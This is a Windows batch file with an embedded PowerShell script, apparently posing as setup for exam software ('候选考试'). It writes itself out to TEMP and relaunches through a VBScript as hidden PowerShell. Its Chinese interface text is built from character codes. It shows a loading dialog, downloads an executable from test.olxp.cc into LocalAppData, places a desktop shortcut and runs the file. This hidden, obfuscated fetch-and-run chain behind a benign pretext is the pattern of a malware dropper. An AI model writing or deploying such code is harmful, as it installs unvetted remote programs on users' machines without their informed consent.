@echo off
copy /y "%~f0" "%TEMP%\exam-setup.txt" >nul
echo $p = Join-Path $env:TEMP 'exam-setup.ps1' > "%TEMP%\exam-run.ps1"
echo Get-Content -LiteralPath (Join-Path $env:TEMP 'exam-setup.txt') ^| Select-Object -Skip 9 ^| Set-Content -Encoding ASCII -LiteralPath $p >> "%TEMP%\exam-run.ps1"
echo ^& $p >> "%TEMP%\exam-run.ps1"
echo Set sh = CreateObject("WScript.Shell") > "%TEMP%\exam-launch.vbs"
echo sh.Run "powershell.exe -NoProfile -STA -WindowStyle Hidden -File " ^& Chr(34) ^& "%TEMP%\exam-run.ps1" ^& Chr(34), 0, False >> "%TEMP%\exam-launch.vbs"
wscript //nologo "%TEMP%\exam-launch.vbs"
exit /b
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()
$n = -join [char[]](0x5019,0x9009,0x8003,0x8BD5)
$dir = Join-Path $env:LOCALAPPDATA $n
$dest = Join-Path $dir ($n + '.exe')
$url = 'https://test.olxp.cc/download/%E5%80%99%E9%80%89%E8%80%83%E8%AF%95.exe'
New-Item -ItemType Directory -Force -Path $dir | Out-Null
$form = New-Object System.Windows.Forms.Form
$form.Text = $n
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.StartPosition = 'CenterScreen'
$form.TopMost = $true
$form.ClientSize = New-Object System.Drawing.Size(360, 150)
$form.BackColor = [System.Drawing.Color]::White
$form.Font = New-Object System.Drawing.Font('Microsoft YaHei UI', 11)
$label = New-Object System.Windows.Forms.Label
$label.TextAlign = 'MiddleCenter'
$label.SetBounds(16, 12, 328, 52)
$label.Text = [string]::new([char[]](0x5185,0x5BB9,0x52A0,0x8F7D,0x4E2D,0xFF0C,0x8BF7,0x52FF,0x5173,0x95ED,0x7A97,0x53E3))
$track = New-Object System.Windows.Forms.Panel
$track.BackColor = [System.Drawing.Color]::FromArgb(226, 230, 229)
$track.SetBounds(28, 72, 304, 18)
$fill = New-Object System.Windows.Forms.Panel
$fill.BackColor = [System.Drawing.Color]::FromArgb(18, 124, 134)
$fill.SetBounds(0, 0, 0, 18)
$track.Controls.Add($fill)
$pct = New-Object System.Windows.Forms.Label
$pct.TextAlign = 'MiddleCenter'
$pct.SetBounds(28, 98, 304, 28)
$pct.Text = '0%'
$form.Controls.Add($label)
$form.Controls.Add($track)
$form.Controls.Add($pct)
$form.Show()
$form.Activate()
[System.Windows.Forms.Application]::DoEvents()
$ready = $false
if (Test-Path -LiteralPath $dest) {
  if ((Get-Item -LiteralPath $dest).Length -gt 1MB) { $ready = $true }
}
function Set-Progress([int64]$done, [int64]$total) {
  $value = 0
  if ($total -gt 0) { $value = [int](($done * 1000) / $total) }
  if ($value -lt 0) { $value = 0 }
  if ($value -gt 1000) { $value = 1000 }
  $fill.Width = [int]($track.Width * $value / 1000)
  $pct.Text = ([string][int]($value / 10)) + '%'
  [System.Windows.Forms.Application]::DoEvents()
}
if (-not $ready) {
  $out = $null
  $resp = $null
  try {
    $req = [System.Net.HttpWebRequest]::Create($url)
    $req.Method = 'GET'
    $resp = $req.GetResponse()
    $total = [int64]$resp.ContentLength
    if ($total -le 0) { $total = 2933248 }
    $body = $resp.GetResponseStream()
    $out = [System.IO.File]::Create($dest)
    $buf = New-Object byte[] 65536
    $done = [int64]0
    while (($nread = $body.Read($buf, 0, $buf.Length)) -gt 0) {
      $out.Write($buf, 0, $nread)
      $done += $nread
      Set-Progress $done $total
    }
    $out.Close()
    $body.Close()
    $resp.Close()
    $out = $null
    $resp = $null
    if (-not (Test-Path -LiteralPath $dest) -or ((Get-Item -LiteralPath $dest).Length -le 1MB)) {
      throw 'short'
    }
    Set-Progress $total $total
  } catch {
    if ($out) { $out.Close() }
    if ($resp) { $resp.Close() }
    if (Test-Path -LiteralPath $dest) { Remove-Item -LiteralPath $dest -Force -ErrorAction SilentlyContinue }
    $form.Close()
    [System.Windows.Forms.MessageBox]::Show([string]::new([char[]](0x4E0B,0x8F7D,0x5931,0x8D25,0x3002)), $n) | Out-Null
    exit 1
  }
}
Set-Progress 1 1
$label.Text = [string]::new([char[]](0x6B63,0x5728,0x6253,0x5F00,0x002E,0x002E,0x002E))
[System.Windows.Forms.Application]::DoEvents()
$lnk = Join-Path ([Environment]::GetFolderPath('Desktop')) ($n + '.lnk')
if (-not (Test-Path -LiteralPath $lnk)) {
  $s = (New-Object -ComObject WScript.Shell).CreateShortcut($lnk)
  $s.TargetPath = $dest
  $s.Save()
}
Start-Process -FilePath $dest
Start-Sleep -Milliseconds 500
$form.Close()
